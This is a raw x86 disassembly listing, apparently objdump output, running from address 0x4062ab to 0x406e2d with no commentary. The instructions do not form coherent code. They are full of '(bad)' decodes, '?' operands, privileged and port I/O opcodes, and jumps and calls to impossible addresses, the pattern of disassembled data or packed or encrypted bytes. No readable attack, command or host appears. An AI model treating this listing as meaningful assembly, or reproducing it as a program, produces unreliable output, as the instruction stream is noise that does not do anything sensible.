  4062ab:	div    DWORD PTR [esi]
  4062ad:	cmp    al,0xf1
  4062af:	mul    BYTE PTR [esi]
  4062b1:	into   
  4062b2:	push   ebp
  4062b3:	adc    ecx,ebp
  4062b5:	jmp    0x97e1b3a
  4062ba:	adc    eax,0xea4efcc5
  4062bf:	shl    DWORD PTR [ebp+0xbf1a62],cl
	...
  4062ed:	add    BYTE PTR [ebp+0x65],bl
  4062f0:	cli    
  4062f1:	mov    esi,0x89eececb
  4062f6:	jge    0x4062da
  4062f8:	mov    es,WORD PTR [esi]
  4062fa:	js     0x40631f
  4062fc:	test   al,0xc4
  4062fe:	dec    edi
  4062ff:	pop    esp
  406300:	mov    bl,0x8e
  406302:	aam    0x2b
  406304:	mov    eax,ds:0x912bd6e6
  406309:	mov    BYTE PTR [edx-0x75f437c1],ch
  40630f:	adc    edx,ebp
  406311:	pop    ecx
  406312:	jp     0x4062ae
  406314:	stos   BYTE PTR es:[edi],al
  406315:	adc    DWORD PTR ds:0xea620082,edi
  40631b:	sub    edi,ebx
  40631d:	retf   0x2be3
  406320:	stc    
  406321:	je     0x40633c
  406323:	pop    eax
  406324:	bound  eax,QWORD PTR [esp+esi*1]
  406327:	imul   eax,DWORD PTR [ebx],0xc09a89af
  40632d:	in     al,0x38
  40632f:	pushf  
  406330:	mov    eax,DWORD PTR [edx+0x70]
  406333:	and    eax,DWORD PTR [bx+si+0x68]
  406337:	lea    ebx,fs:[ebp+0x4c]
  40633b:	sbb    esi,DWORD PTR [ebx+0x565b7da9]
  406341:	add    DWORD PTR [ebx+0x6dea099c],eax
  406347:	sar    eax,cl
  406349:	fimul  DWORD PTR [ebx-0x7a2504c5]
  40634f:	int    0x8c
  406351:	test   BYTE PTR [eax],0x0
	...
  40637c:	xchg   edx,eax
  40637d:	add    DWORD PTR [esi-0x39],ebx
  406380:	cmp    BYTE PTR ds:0x4e02282c,cl
  406386:	add    esp,DWORD PTR [ebx]
  406388:	mov    al,0x61
  40638a:	xor    esp,eax
  40638c:	and    esp,DWORD PTR [edi+0x33]
  40638f:	jecxz  0x40634a
  406391:	mov    edi,0xa5ff831f
  406396:	jmp    0xc3dc8b85
  40639b:	fld    QWORD PTR [edx-0x7c]
  40639e:	mov    eax,eax
  4063a0:	jmp    0x406403
  4063a2:	and    esi,DWORD PTR [ebx+0x658d63f3]
  4063a8:	aas    
  4063a9:	add    BYTE PTR [eax],dl
  4063ab:	(bad)  
  4063ac:	out    dx,eax
  4063ad:	pop    edx
  4063ae:	inc    esi
  4063af:	cmc    
  4063b0:	cld    
  4063b1:	fwait
  4063b2:	add    eax,0xfbd302ea
  4063b7:	fiadd  DWORD PTR [ebp-0xbff06c6]
  4063bd:	lahf   
  4063be:	lea    edx,[eax+ecx*4-0x6abbebf9]
  4063c5:	push   edi
  4063c6:	push   esi
  4063c7:	sub    dh,dl
  4063c9:	xchg   ebp,eax
  4063ca:	or     DWORD PTR [ebx],eax
  4063cc:	push   edi
  4063cd:	sar    al,1
  4063cf:	xor    ebx,DWORD PTR ds:0xef33fa78
  4063d5:	aad    0x8c
  4063d7:	movhps xmm7,QWORD PTR [ecx+0x1464d8a1]
  4063de:	cmp    al,0xc1
	...
  406408:	add    BYTE PTR [eax],al
  40640a:	es push ecx
  40640c:	add    ecx,edx
  40640e:	fcomp  QWORD PTR [ebx+esi*1+0x339f34f9]
  406415:	cli    
  406416:	rol    dl,cl
  406418:	pop    ds
  406419:	enter  0x881c,0xe7
  40641d:	add    edx,DWORD PTR [ecx+0x4bc3c14a]
  406423:	push   edi
  406424:	(bad)  [ebx+0x23fa683e]
  40642a:	cmp    eax,0x9b8df868
  40642f:	pop    esp
  406430:	out    0xcd,al
  406432:	ss jp  0x406437
  406435:	inc    esi
  406436:	dec    ebx
  406437:	call   0xfb8b:0x972405c0
  40643e:	and    al,0x9f
  406440:	and    edi,ecx
  406442:	and    al,0xa0
  406444:	lea    edx,[eax+ebx*1-0x5bc8f874]
  40644b:	push   esi
  40644c:	push   esi
  40644d:	cmp    BYTE PTR [esi-0x38fcf669],dl
  406453:	into   
  406454:	clc    
  406455:	xor    ebx,DWORD PTR [ebp-0x60cc058a]
  40645b:	aam    0x8c
  40645d:	(bad)  
  40645f:	in     eax,dx
  406460:	add    eax,0x4970cad5
  406465:	or     al,0x7f
  406467:	mov    dl,0x9
  406469:	add    eax,DWORD PTR [eax+ebp*8+0x33bc]
	...
  406498:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406499:	nop
  40649a:	mov    ebx,0x96fea433
  40649f:	pop    ds
  4064a0:	stos   DWORD PTR es:[edi],eax
  4064a1:	pop    edi
  4064a2:	pop    ebp
  4064a3:	inc    ebp
  4064a4:	cmp    eax,0x7dc0e39e
  4064a9:	pop    edi
  4064aa:	add    al,0xd9
  4064ac:	mov    ch,0xa
  4064ae:	hlt    
  4064af:	cli    
  4064b0:	sbb    eax,0xc3f8f41a
  4064b5:	idiv   edi
  4064b7:	add    al,0x57
  4064b9:	adc    BYTE PTR [edx+0x3],ch
  4064bc:	clc    
  4064bd:	addr16 ret 0x43c0
  4064c1:	jno    0x406487
  4064c3:	mov    edx,DWORD PTR [ebp-0x80]
  4064c6:	mov    ebx,0xbc804723
  4064cb:	lea    ebp,[edx+0x29a3bb64]
  4064d1:	push   edi
  4064d2:	add    al,0x56
  4064d4:	inc    esi
  4064d5:	xor    eax,ebp
  4064d7:	or     DWORD PTR ds:0x6df88c42,edi
  4064dd:	push   0x7a4dfae3
  4064e2:	mov    DWORD PTR [ecx+eax*2-0x5e90fd65],ecx
  4064e9:	jno    0x406530
  4064eb:	sbb    al,0xff
  4064ed:	mov    bl,0x6
  4064ef:	add    eax,DWORD PTR [edx+ebp*8]
  4064f2:	mov    ecx,0xbc51f733
  4064f7:	xor    esp,esp
  4064f9:	not    DWORD PTR [edi+0x1f]
	...
  406523:	add    BYTE PTR [eax],al
  406525:	add    BYTE PTR [esi+edi*1+0x5b3d8cea],dh
  40652c:	inc    edi
  40652d:	hlt    
  40652e:	(bad)  
  40652f:	cwde   
  406530:	cmc    
  406531:	add    ah,bh
  406533:	rcl    BYTE PTR [eax-0x6dd7380d],1
  406539:	mov    edx,eax
  40653b:	push   esp
  40653c:	sub    edi,ebp
  40653e:	mov    bh,0x5c
  406540:	jmp    0x3d00:0xa99a523d
  406547:	cwde   
  406548:	bound  edi,QWORD PTR [ebx-0x43e59db3]
  40654e:	ret    
  40654f:	(bad)  
  406550:	test   BYTE PTR [eax+edx*4-0x17fc9216],0x3a
  406558:	sub    dl,al
  40655a:	inc    ebp
  40655b:	pop    eax
  40655c:	sbb    DWORD PTR [ebx-0xcbdd78a],ecx
  406562:	addr16 into 
  406564:	gs pop es
  406566:	sbb    al,0xfa
  406568:	dec    ebx
  406569:	sub    DWORD PTR ds:0x7fc4d50d,edi
  40656f:	dec    ebx
  406570:	jmp    0xdbb:0xda61b5c9
  406577:	bound  ebx,QWORD PTR [eax+ebx*4+0x59]
  40657b:	dec    edi
  40657c:	shl    DWORD PTR [eax-0x460a7cd],0xfe
  406583:	xchg   edi,eax
  406584:	fiadd  WORD PTR [edx]
  406586:	pop    es
  406587:	shl    al,1
  406589:	repnz add BYTE PTR [eax],al
	...
  4065b4:	pop    ss
  4065b5:	sub    dl,ah
  4065b7:	mov    BYTE PTR [edx-0x3755daad],bh
  4065bd:	mov    dh,0xea
  4065bf:	cmp    eax,0xffa99a3a
  4065c4:	cmp    al,0x98
  4065c6:	jb     0x406582
  4065c8:	sub    eax,0xbbbbfa62
  4065cd:	mov    BYTE PTR [eax],0xde
  4065d0:	push   edx
  4065d1:	mov    esi,ds
  4065d3:	and    bh,BYTE PTR ds:0xffa81005
  4065d9:	dec    edi
  4065da:	add    edi,DWORD PTR [ecx-0x6dcc9d4c]
  4065e0:	int3   
  4065e1:	popa   
  4065e2:	lea    ebx,[ebp+0x40]
  4065e5:	sti    
  4065e6:	dec    edx
  4065e7:	inc    edx
  4065e8:	jecxz  0x406641
  4065ea:	dec    esi
  4065eb:	fld    QWORD PTR [edx+0x77ea1099]
  4065f1:	iret   
  4065f2:	cli    
  4065f3:	mov    edx,0x74f927d5
  4065f8:	test   eax,0x109d703b
  4065fd:	popf   
  4065fe:	add    esi,DWORD PTR [edi-0x93c656b]
  406604:	cmp    al,0x82
  406606:	mov    eax,DWORD PTR [eax+0x6c]
  406609:	popa   
  40660a:	xor    eax,DWORD PTR [edx-0x4a]
  40660d:	(bad)  
  40660e:	pop    es
  40660f:	das    
  406610:	sub    eax,eax
  406612:	sub    dl,ch
  406614:	sbb    esp,DWORD PTR [edi]
  406616:	shr    DWORD PTR [ecx],0x0
	...
  406641:	add    BYTE PTR [ecx+0x58],dl
  406644:	ret    
  406645:	jb     0x4065cb
  406647:	daa    
  406648:	stc    
  406649:	fiadd  DWORD PTR [ebp-0x8096b33]
  40664f:	and    BYTE PTR [ecx-0x3e8ec3ed],0x2b
  406656:	xor    al,0x5e
  406658:	shl    BYTE PTR [edx-0x1b],1
  40665b:	mov    ?,ebx
  40665d:	mov    edx,0xf68be8d7
  406662:	nop
  406663:	mov    ebp,edi
  406665:	mov    ch,0x3f
  406667:	test   eax,0x6bfda80c
  40666c:	add    esp,DWORD PTR [ebx+0x3355c7]
  406672:	dec    DWORD PTR [eax+edi*8-0x73]
  406676:	mov    esi,DWORD PTR [eax+0x5]
  406679:	sbb    eax,0x5e035b5f
  40667e:	out    dx,eax
  40667f:	sbb    eax,0x35e417c3
  406684:	mov    edi,ecx
  406686:	in     al,0x14
  406688:	xor    edi,ebx
  40668a:	pop    edx
  40668b:	fild   DWORD PTR [esi]
  40668d:	cmp    edi,esi
  40668f:	sub    ebx,ecx
  406691:	add    esp,DWORD PTR [ecx+0x3b]
  406694:	rol    al,0xa3
  406697:	pop    ebx
  406698:	ret    
  406699:	mov    ebp,DWORD PTR [esp+ecx*2]
  40669c:	clc    
  40669d:	xor    ecx,DWORD PTR [edi]
  40669f:	loop   0x406634
  4066a1:	pop    ss
  4066a2:	add    dh,dh
  4066a4:	(bad)  
	...
  4066ce:	add    BYTE PTR [eax],al
  4066d0:	xchg   esp,eax
  4066d1:	test   al,0x30
  4066d3:	rcl    DWORD PTR [ebp+0x64],0x3
  4066d7:	rcr    ah,1
  4066d9:	push   ss
  4066da:	xor    edi,ebx
  4066dc:	je     0x4066f2
  4066de:	lea    ecx,[eax+ebx*2-0x775d83ea]
  4066e5:	pop    ebx
  4066e6:	dec    esi
  4066e7:	cmp    al,0x26
  4066e9:	push   ds
  4066ea:	adc    BYTE PTR [ebx],al
  4066ec:	or     eax,0x1f33f9e4
  4066f1:	dec    esp
  4066f2:	clc    
  4066f3:	(bad)  
  4066f4:	retf   
  4066f5:	outs   dx,DWORD PTR ds:[esi]
  4066f6:	gs push esi
  4066f8:	jnp    0x406715
  4066fa:	add    ebx,DWORD PTR [esi+0x2f]
  4066fd:	sbb    eax,0x351417c3
  406702:	mov    edi,0xff0f28ff
  406707:	xor    ecx,DWORD PTR ds:0x1e33fb63
  40670d:	loope  0x406692
  40670f:	pop    es
  406710:	arpl   WORD PTR ds:0x453ef428,di
  406716:	std    
  406717:	sar    dh,0x41
  40671a:	add    bl,al
  40671c:	mov    cl,0x20
  40671e:	mov    ah,0xff
  406720:	jmp    0xe64c2179
  406725:	push   esp
  406726:	mov    eax,0x8c30b28d
  40672b:	jmp    DWORD PTR [eax*4+0x32a5601]
  406732:	ror    DWORD PTR [edx],0x0
	...
  40675d:	add    BYTE PTR ds:0xb9ff7414,bh
  406763:	call   0x4cf59b1b
  406768:	mov    ecx,0x87c6a633
  40676d:	psubusw mm4,QWORD PTR [edi+ecx*4]
  406771:	stos   DWORD PTR es:[edi],eax
  406772:	cmp    eax,0x7fc0fc7a
  406777:	push   eax
  406778:	add    dl,cl
  40677a:	leave  
  40677b:	mov    eax,0x7481ffb4
  406780:	mov    esp,0xba74770b
  406785:	(bad)  
  406786:	rol    BYTE PTR [eax-0x6],cl
  406789:	lahf   
  40678a:	int    0x97
  40678c:	add    BYTE PTR [esi+0x4a],bl
  40678f:	add    eax,0x15
  406792:	cmp    eax,0x51ff746b
  406797:	xor    BYTE PTR [ebx+esi*1+0x33b84c44],0x47
  40679f:	mov    esi,0xbfd077f
  4067a4:	pop    eax
  4067a5:	gs cmp eax,0xfec0f308
  4067ab:	inc    eax
  4067ac:	add    bl,al
  4067ae:	loope  0x406801
  4067b0:	mov    bl,0xff
  4067b2:	sbb    DWORD PTR [esi],edx
  4067b4:	mov    edx,0x1a5c160b
  4067b9:	scas   eax,DWORD PTR es:[edi]
  4067ba:	mov    ebx,0xf295f5ef
  4067bf:	addr16 popw es
	...
  4067ea:	add    BYTE PTR [eax],al
  4067ec:	nop
  4067ed:	addr16 test al,0xc6
  4067f0:	inc    esp
  4067f1:	pop    esp
  4067f2:	cdq    
  4067f3:	jae    0x4067de
  4067f5:	pop    eax
  4067f6:	mov    esi,0xe2542db3
  4067fb:	lods   eax,DWORD PTR ds:[esi]
  4067fc:	or     eax,0x41805c53
  406801:	(bad)  
  406802:	popf   
  406803:	mov    ds:0xdc2f5cc9,eax
  406808:	(bad)  
  406809:	sbb    ah,dh
  40680b:	push   es
  40680c:	test   BYTE PTR [eax],bl
  40680e:	mov    ?,WORD PTR [ebx-0x5445a74f]
  406814:	xor    eax,0xb3adba52
  406819:	not    ebp
  40681b:	aam    0xfb
  40681d:	fisub  WORD PTR [ebx+0x7]
  406820:	lock pop esi
  406822:	sub    bh,al
  406824:	xor    ebx,DWORD PTR [eax+eax*2+0x73]
  406828:	sbb    DWORD PTR [eax+0x56],0xe2552db3
  40682f:	scas   al,BYTE PTR es:[edi]
  406830:	sub    eax,0x41887452
  406835:	test   al,0xbf
  406837:	pop    ebx
  406838:	rcr    DWORD PTR [ebx-0x51],1
  40683b:	jecxz  0x4068bb
  40683d:	sbb    esp,edi
  40683f:	push   es
  406840:	jge    0x40685a
  406842:	es mov bl,0x49
  406845:	pop    eax
  406846:	fisubr DWORD PTR [ebp+esi*1-0x345125ad]
  40684d:	out    dx,al
  40684e:	cmc    
  40684f:	mov    ds:0x0,eax
	...
  406878:	add    BYTE PTR [eax],al
  40687a:	sbb    BYTE PTR [edi-0x686ff8f9],al
  406880:	sub    dh,al
  406882:	xor    al,0x5c
  406884:	add    BYTE PTR [ecx],bl
  406886:	lea    ebx,[eax-0x1]
  406889:	out    dx,al
  40688a:	int3   
  40688b:	mov    edi,ebx
  40688d:	repnz fisttp DWORD PTR [ebx+0x68816cf8]
  406894:	adc    al,0x2a
  406896:	inc    ebx
  406897:	cld    
  406898:	add    bl,BYTE PTR [edi]
  40689a:	inc    edx
  40689b:	sbb    al,cl
  40689d:	test   BYTE PTR [eax+0x25],0xbf
  4068a1:	mov    esi,0xfaff57ac
  4068a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4068a7:	arpl   cx,di
  4068a9:	cli    
  4068aa:	mov    ds:0x63069be5,eax
  4068af:	push   0x8
  4068b1:	das    
  4068b2:	cmp    DWORD PTR [ecx+0x6d80a834],edi
  4068b8:	add    esi,DWORD PTR [eax-0x7900a7d4]
  4068be:	in     al,dx
  4068bf:	mov    edi,edx
  4068c1:	repnz ror BYTE PTR [ebx+0x5fc164f9],1
  4068c8:	sub    bh,0xe8
  4068cb:	dec    edi
  4068cc:	add    ebp,DWORD PTR [edi-0x183fe5d3]
  4068d2:	cmp    BYTE PTR [edi+edi*4],bl
  4068d5:	push   esi
  4068d6:	lods   al,BYTE PTR ds:[esi]
  4068d7:	push   edi
  4068d8:	call   FWORD PTR [edx]
  4068da:	mov    ds:0xfaf863,eax
	...
  406907:	add    BYTE PTR [eax+0x66d693e5],bl
  40690d:	dec    ecx
  40690e:	cmp    dh,BYTE PTR [eax+eax*2-0x4f]
  406912:	sub    al,0x28
  406914:	jnp    0x40697a
  406916:	add    edi,DWORD PTR [ecx]
  406918:	int3   
  406919:	push   edi
  40691a:	call   FWORD PTR [esi]
  40691c:	mov    WORD PTR [ebx-0x75141d05],cs
  406922:	clc    
  406923:	pop    esp
  406924:	mov    cl,0x66
  406926:	mov    ebx,0x2a314500
  40692b:	add    edx,ecx
  40692d:	push   edx
  40692e:	rol    cl,0x20
  406931:	pop    esi
  406932:	retf   0x20bf
  406935:	or     eax,0x724ffff
  40693a:	or     edi,ecx
  40693c:	and    al,0x5
  40693e:	lea    ebx,[eax+esi*8-0x3792d17]
  406945:	pusha  
  406946:	pop    esi
  406947:	and    al,0x96
  406949:	and    BYTE PTR ds:0x7dd89e03,dl
  40694f:	or     dh,ah
  406951:	arpl   WORD PTR [ecx],ax
  406953:	pop    edi
  406954:	fistp  DWORD PTR [ecx+0x4f]
  406957:	or     dh,dl
  406959:	mov    bl,0xc
  40695b:	call   DWORD PTR [edx]
  40695d:	or     ecx,DWORD PTR [ebp-0x76a3988a]
  406963:	bswap  ebp
  406965:	or     al,0xff
  406967:	pop    edx
  406968:	pop    esi
  406969:	test   al,0x58
  40696b:	pop    edi
	...
  406994:	add    BYTE PTR [eax],al
  406996:	inc    ecx
  406997:	adc    al,dl
  406999:	or     al,0xa7
  40699b:	lods   eax,DWORD PTR ds:[esi]
  40699c:	mov    ebp,esp
  40699e:	and    al,0x23
  4069a0:	clc    
  4069a1:	push   edi
  4069a2:	leave  
  4069a3:	scas   eax,DWORD PTR es:[edi]
  4069a4:	mov    DWORD PTR [ebp-0x1d],0x6700005e
  4069ab:	or     esi,DWORD PTR [ebp+0xc]
  4069ae:	adc    BYTE PTR [esi+0x6a5ac7f8],bl
  4069b4:	lea    eax,[ecx+0x57]
  4069b7:	pop    ecx
  4069b8:	and    eax,DWORD PTR [ebp-0x78]
  4069bb:	and    eax,DWORD PTR ds:0x99f214
  4069c1:	mov    esp,ebp
  4069c3:	adc    eax,0x625ac7ef
  4069c8:	lea    eax,[ecx+0x3e]
  4069cb:	inc    esp
  4069cc:	mov    cl,0xdc
  4069ce:	hlt    
  4069cf:	retf   
  4069d0:	leave  
  4069d1:	add    eax,0x43cf4a
  4069d6:	test   al,0xf0
  4069d8:	hlt    
  4069d9:	sgdtd  [edi-0x1d]
  4069dd:	mov    WORD PTR [edi+0x44],?
  4069e0:	mov    bl,0xe1
  4069e2:	in     al,dx
  4069e3:	add    BYTE PTR [esp+ebx*1+0x2fc7eb5],bl
  4069ea:	xor    DWORD PTR [eax],0x1d
  4069ed:	inc    eax
  4069ee:	pushaw 
  4069f0:	jg     0x406a33
  4069f2:	ds je  0x406991
  4069f5:	inc    eax
  4069f6:	fist   DWORD PTR [eax+esi*4]
  4069f9:	add    DWORD PTR [eax],0x0
	...
  406a24:	adc    DWORD PTR [eax],0x43
  406a27:	call   0x43ae2e
  406a2c:	mov    ebp,0x4d40ac6e
  406a31:	push   ss
  406a32:	jl     0x406a91
  406a34:	mov    dh,0xc0
  406a36:	les    eax,FWORD PTR [eax-0x3b]
  406a39:	jle    0x406a37
  406a3b:	add    al,BYTE PTR [ebx]
  406a3d:	loopne 0x406a92
  406a3f:	push   0x42c75a
  406a44:	out    dx,al
  406a45:	fisttp DWORD PTR [ecx]
  406a47:	in     eax,0x91
  406a49:	les    eax,FWORD PTR [edx]
  406a4b:	pop    ebp
  406a4c:	mov    al,BYTE PTR [ebp+0x2b32484]
  406a52:	add    eax,DWORD PTR [eax+0x75f898bd]
  406a58:	push   ebp
  406a59:	rcr    DWORD PTR [eax+ecx*1-0x5c7cb60e],0xda
  406a61:	mov    BYTE PTR [edx+0x0],0x3e
  406a65:	add    DWORD PTR [ebx],ebp
  406a67:	mul    BYTE PTR [esi-0x48]
  406a6a:	add    eax,DWORD PTR [eax]
  406a6c:	ds pop ebx
  406a6e:	bound  edi,QWORD PTR [ebx-0x63e1aabf]
  406a74:	cmp    al,0xcf
  406a76:	jecxz  0x4069fb
  406a78:	fnsave [edi+0x5b3e425c]
  406a7e:	stos   BYTE PTR es:[edi],al
  406a7f:	sub    ebp,DWORD PTR [eax]
  406a81:	loope  0x406a26
  406a83:	call   esi
  406a85:	arpl   cx,bp
  406a87:	add    eax,DWORD PTR [eax]
	...
  406ab1:	add    BYTE PTR [esi],bh
  406ab3:	mov    BYTE PTR [ebx],bl
  406ab5:	mov    eax,0xffb1651f
  406aba:	idiv   eax
  406abc:	dec    eax
  406abd:	cmp    DWORD PTR [edi+0x5b],0xe6921960
  406ac4:	daa    
  406ac5:	add    al,0xd6
  406ac7:	mov    bl,0xe9
  406ac9:	add    edi,DWORD PTR [esi]
  406acb:	cli    
  406acc:	fadd   DWORD PTR [eax+0x19625b7f]
  406ad2:	sub    ah,dh
  406ad4:	daa    
  406ad5:	add    al,0xb5
  406ad7:	add    WORD PTR [ecx-0x4411a481],ax
  406ade:	dec    ecx
  406adf:	and    esi,esp
  406ae1:	mov    esp,0x455c6bdd
  406ae6:	ds loop 0x406ac4
  406ae9:	pop    ss
  406aea:	mov    bl,0x9a
  406aec:	jmp    0x64b3b66d
  406af1:	inc    ebp
  406af2:	ds cli 
  406af4:	int3   
  406af5:	cmp    bh,0x5a
  406af8:	jb     0x406b13
  406afa:	pop    esi
  406afb:	out    0xa7,al
  406afd:	add    ecx,DWORD PTR [ecx+0x23]
  406b00:	out    0xb9,al
  406b02:	popf   
  406b03:	ja     0x406b61
  406b05:	inc    ebp
  406b06:	ds loop 0x406ae4
  406b09:	jecxz  0x406abd
  406b0b:	call   0xbc00:0x543219e9
  406b12:	sub    eax,0x5c10c3
	...
  406b3f:	add    BYTE PTR [ebx],al
  406b41:	pop    ebx
  406b42:	call   0xff9504e2
  406b47:	ret    0xb48b
  406b4a:	leave  
  406b4b:	sub    edi,DWORD PTR [esi]
  406b4d:	pop    ebx
  406b4e:	push   ebp
  406b4f:	(bad)  
  406b50:	(bad)  
  406b52:	ret    
  406b53:	add    DWORD PTR [ebx-0x170100ad],edx
  406b59:	fild   WORD PTR [ebx]
  406b5b:	and    al,0x66
  406b5d:	out    0x40,al
  406b5f:	jmp    0x520ddae8
  406b64:	mov    edi,0xb5ee0099
  406b69:	arpl   dx,cx
  406b6b:	pusha  
  406b6c:	cmp    DWORD PTR [esi],esp
  406b6e:	fs pop esp
  406b70:	sbb    BYTE PTR [ebx-0x77],0xdd
  406b74:	inc    dl
  406b76:	lea    ebp,[eax]
  406b78:	inc    edx
  406b79:	call   0xaeff:0x1b629475
  406b80:	cwde   
  406b81:	fild   WORD PTR [ebx]
  406b83:	je     0x406bfa
  406b85:	in     eax,0x40
  406b87:	jmp    0x2dcddac0
  406b8c:	xor    BYTE PTR [edx-0x19be2600],bl
  406b92:	sub    esi,DWORD PTR [edi-0x6]
  406b95:	pop    edx
  406b96:	xor    edx,ebp
  406b98:	mov    esi,0x3a288e7e
  406b9d:	mov    dl,al
  406b9f:	cwde   
  406ba0:	jge    0x406b83
  406ba2:	add    esi,DWORD PTR [eax+eax*1+0x0]
	...
  406bce:	pop    ecx
  406bcf:	in     eax,0x40
  406bd1:	jmp    0x631739d8
  406bd6:	dec    esi
  406bd7:	imul   ecx,DWORD PTR [ebp+0x34e03da8],0x0
  406bde:	sbb    edx,0x40
  406be1:	add    ah,cl
  406be3:	dec    edx
  406be4:	pop    ss
  406be5:	lea    esp,[esi+0x7b35ff57]
  406beb:	fiadd  DWORD PTR [eax+0x0]
  406bee:	enter  0xfca2,0xff
  406bf2:	adc    bh,BYTE PTR [edi]
  406bf4:	mov    WORD PTR [ecx+0x27],es
  406bf7:	rol    BYTE PTR [ebp-0x8],cl
  406bfa:	mov    ?,edx
  406bfc:	(bad)  
  406bfd:	(bad)  
  406bfe:	cmp    ch,dl
  406c00:	(bad)  
  406c01:	mov    esp,DWORD PTR [eax+0x9]
  406c04:	shl    BYTE PTR [ebx],cl
  406c06:	popa   
  406c07:	cmp    eax,0x1d1cfc54
  406c0c:	add    eax,DWORD PTR [edx+ecx*4]
  406c0f:	xchg   ebx,eax
  406c10:	lea    eax,[ecx-0x19]
  406c13:	pop    ebx
  406c14:	inc    ebp
  406c15:	clc    
  406c16:	loop   0x406bfd
  406c18:	js     0x406b9c
  406c1a:	sub    eax,0x68fc7500
  406c1f:	call   0xc6c1:0xb1a89f8
  406c26:	jmp    0x84cc6afe
  406c2b:	push   ds
  406c2c:	ret    
  406c2d:	add    eax,0x754126d4
	...
  406c5a:	add    BYTE PTR [eax],al
  406c5c:	jmp    0x406c24
  406c5e:	in     al,dx
  406c5f:	dec    eax
  406c61:	add    BYTE PTR [ebx+0x33281cc6],cl
  406c67:	inc    ebp
  406c68:	mov    ebx,0xa303c14c
  406c6d:	rol    esp,1
  406c6f:	lea    esp,[esi+0x57]
  406c72:	add    eax,DWORD PTR [ebp+0xf]
  406c75:	pop    edx
  406c76:	mov    eax,ds:0xff70feeb
  406c7b:	jne    0x406c98
  406c7d:	rol    BYTE PTR [ebp-0x8],1
  406c80:	ds mov ebx,0x7a7ffc2f
  406c86:	push   cs
  406c87:	mov    esp,DWORD PTR [eax-0x33]
  406c8a:	mov    cl,0xc1
  406c8c:	jge    0x406cc5
  406c8e:	add    al,bl
  406c90:	dec    DWORD PTR [esi]
  406c92:	sar    DWORD PTR [ecx-0x527ea6],cl
  406c98:	mov    ch,0x81
  406c9a:	jns    0x406cf1
  406c9c:	cmp    cl,BYTE PTR [ebp+0x46]
  406c9f:	cld    
  406ca0:	pop    ebp
  406ca1:	xchg   ecx,eax
  406ca2:	loope  0x406c69
  406ca4:	xor    eax,0xb3040186
  406ca9:	das    
  406caa:	jge    0x406ced
  406cac:	ds inc ebp
  406cae:	inc    esi
  406caf:	clc    
  406cb0:	cmp    ebp,DWORD PTR [eax+0x70]
  406cb3:	sbb    edi,DWORD PTR [ecx-0x4e03c9c0]
  406cb9:	jle    0x406c67
  406cbb:	mov    DWORD PTR [ebx+0x30],edi
  406cbe:	ret    0xc6
	...
  406ce9:	add    BYTE PTR [eax-0x43],dl
  406cec:	lods   eax,DWORD PTR ds:[esi]
  406ced:	mov    ebp,ebp
  406cef:	add    al,al
  406cf1:	add    eax,0x7541fc3d
  406cf6:	add    eax,0xd1ff9edb
  406cfb:	or     BYTE PTR [eax-0x3a],bh
  406cfe:	mov    ch,0xe8
  406d00:	out    dx,eax
  406d01:	inc    esp
  406d02:	ret    0xc134
  406d05:	add    eax,DWORD PTR [edx-0x41]
  406d08:	daa    
  406d09:	mov    ?,edi
  406d0b:	inc    ebx
  406d0c:	add    BYTE PTR [ebp-0x5a],al
  406d0f:	ss aad 0xc1
  406d12:	sbb    al,0xe
  406d14:	lods   al,BYTE PTR ds:[esi]
  406d15:	jne    0x406cb1
  406d17:	rol    BYTE PTR [esi-0x8],0xc7
  406d1b:	inc    esi
  406d1c:	scas   eax,DWORD PTR es:[edi]
  406d1d:	rol    DWORD PTR [eax-0x4a0187df],0x5a
  406d24:	pop    edx
  406d25:	ret    0x577d
  406d28:	jmp    0x4b02:0x39c7ffcb
  406d2f:	imul   ebx,DWORD PTR [edx+eax*2+0x3e],0x5c
  406d34:	cld    
  406d35:	pop    ss
  406d36:	retf   
  406d37:	fwait
  406d38:	jmp    0x64b3803f
  406d3d:	inc    edx
  406d3e:	ds out 0xa3,al
  406d41:	scas   eax,DWORD PTR es:[edi]
  406d42:	aas    
  406d43:	pop    eax
  406d44:	add    eax,0x725b7f7f
  406d49:	inc    esi
  406d4a:	ss pop ebx
  406d4c:	in     al,dx
  406d4d:	jecxz  0x406d4f
	...
  406d77:	add    BYTE PTR [edx-0x2451666],bh
  406d7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406d7e:	jb     0x406d1f
  406d80:	sbb    edi,eax
  406d82:	icebp  
  406d83:	fwait
  406d84:	pop    eax
  406d85:	and    cl,ch
  406d87:	add    edi,DWORD PTR [ebp+0x5835ee53]
  406d8d:	push   eax
  406d8e:	pop    esp
  406d8f:	cld    
  406d90:	loope  0x406e02
  406d92:	scas   al,BYTE PTR es:[edi]
  406d93:	add    al,0x3e
  406d95:	fs test eax,0xce134131
  406d9b:	stos   DWORD PTR es:[edi],eax
  406d9c:	loope  0x406dee
  406d9e:	rcl    BYTE PTR [edi],cl
  406da0:	lds    ebx,FWORD PTR [ebx+0x1b4593ed]
  406da6:	cmp    al,0x3
  406da8:	xchg   BYTE PTR [eax-0x52],dl
  406dab:	stos   DWORD PTR es:[edi],eax
  406dac:	rol    DWORD PTR [ebp+ebp*8+0x7e],0x3e
  406db1:	in     al,0xe8
  406db3:	mov    esp,0x50e9577c
  406db8:	mov    ch,0x3f
  406dba:	push   0xffffffc0
  406dbc:	scas   al,BYTE PTR es:[edi]
  406dbd:	lods   al,BYTE PTR ds:[esi]
  406dbe:	mov    edx,0x135924ce
  406dc3:	add    eax,0x81005d24
  406dc8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406dc9:	and    DWORD PTR [eax],eax
  406dcb:	jmp    0xdd3fc188
  406dd0:	inc    ebx
  406dd1:	inc    esp
  406dd2:	bound  esi,QWORD PTR [edx-0x7e]
  406dd5:	lds    edx,FWORD PTR [eax]
  406dd7:	dec    DWORD PTR fs:[edx+0x50]
  406ddb:	inc    ecx
	...
  406e04:	add    BYTE PTR [eax],al
  406e06:	pop    ds
  406e07:	cmp    eax,0x181c46ff
  406e0c:	inc    ebp
  406e0d:	cmp    DWORD PTR [eax],edi
  406e0f:	pop    ebx
  406e10:	mov    esp,DWORD PTR [ebp+ebp*1-0x3d383327]
  406e17:	popf   
  406e18:	repnz push 0x67
  406e1b:	pop    edi
  406e1c:	add    BYTE PTR [ebp-0x1abb1bc2],dl
  406e22:	enter  0x836f,0x8c
  406e26:	sub    DWORD PTR [eax+0x74],edx
  406e29:	repz ror ch,0x8
  406e2d:	jmp    0xcd2bc580
